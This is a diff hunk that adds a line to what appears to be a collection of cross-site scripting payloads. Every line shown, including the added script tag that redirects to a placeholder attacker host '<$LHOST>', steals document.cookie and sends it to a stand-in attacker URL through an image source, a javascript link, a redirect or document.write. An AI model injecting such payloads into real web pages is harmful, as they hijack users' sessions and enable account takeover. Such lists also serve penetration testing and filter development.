@@ -21,6 +21,8 @@ new Image().src="http://www.example.com/c.php?c="+encodeURI(document.cookie);
 
 <a href="javascript:document.location='http://www.example.com/c.php?c='+document.cookie;">Click here!</a>
 
+<script type="text/javascript"> document.location='http://<$LHOST>/log.php?q='+document.cookie; </script>
+
 <script>
 document.write("<img src=http://www.examplesdfdf.com/c.php?c="+ document.cookie+">");
 </script>
